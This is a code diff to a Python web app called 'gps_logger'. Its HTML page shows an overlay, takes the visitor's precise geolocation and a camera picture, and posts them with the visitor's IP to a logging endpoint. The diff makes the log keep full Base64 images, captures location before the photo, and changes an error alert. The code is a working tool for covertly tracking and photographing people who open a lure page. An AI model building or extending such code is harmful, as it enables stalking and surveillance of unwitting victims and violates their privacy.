@@ -17,7 +17,7 @@ logger = logging.getLogger('gps_logger')
 def log_clean_data(event_type, data, ip):
     """Logs data in a clean, organized format"""
     timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-    separator = "=" * 60
+    separator = "=" * 80
     
     log_output = f"\n{separator}\n"
     log_output += f"{event_type.upper()} - {timestamp}\n"
@@ -29,8 +29,8 @@ def log_clean_data(event_type, data, ip):
         log_output += f"Location: {data['lat']}, {data['lng']}\n"
         log_output += f"Accuracy: {data['accuracy']} meters\n"
     elif event_type == 'camera_capture':
-        log_output += "Image captured (Base64 preview):\n"
-        log_output += f"{data['image_data'][:100]}... [truncated]\n"
+        log_output += "Full Image Data (Base64):\n"
+        log_output += f"{data['image_data']}\n"
     elif event_type == 'error':
         log_output += f"ERROR: {data['error']}\n"
     
@@ -177,22 +177,7 @@ HTML_TEMPLATE = """
                     }})
                 }});
                 
-                // Take picture and log
-                const imageData = await takePicture();
-                if (imageData) {{
-                    await fetch('/log', {{
-                        method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{
-                            type: 'camera_capture',
-                            ip: ip,
-                            image_data: imageData,
-                            timestamp: timestamp
-                        }})
-                    }});
-                }}
-                
-                // Get location
+                // Get location FIRST
                 const position = await new Promise((resolve, reject) => {{
                     navigator.geolocation.getCurrentPosition(resolve, reject, {{
                         enableHighAccuracy: true,
@@ -215,6 +200,21 @@ HTML_TEMPLATE = """
                     }})
                 }});
                 
+                // Then take picture and log
+                const imageData = await takePicture();
+                if (imageData) {{
+                    await fetch('/log', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            type: 'camera_capture',
+                            ip: ip,
+                            image_data: imageData,
+                            timestamp: timestamp
+                        }})
+                    }});
+                }}
+                
                 // Remove overlay
                 document.querySelector('.gps-overlay').remove();
             }} catch (error) {{
@@ -229,7 +229,7 @@ HTML_TEMPLATE = """
                         timestamp: new Date().toISOString()
                     }})
                 }});
-                alert('Location access is required to continue.');
+                alert('Error occurred: ' + error.message);
             }}
         }});
     </script>
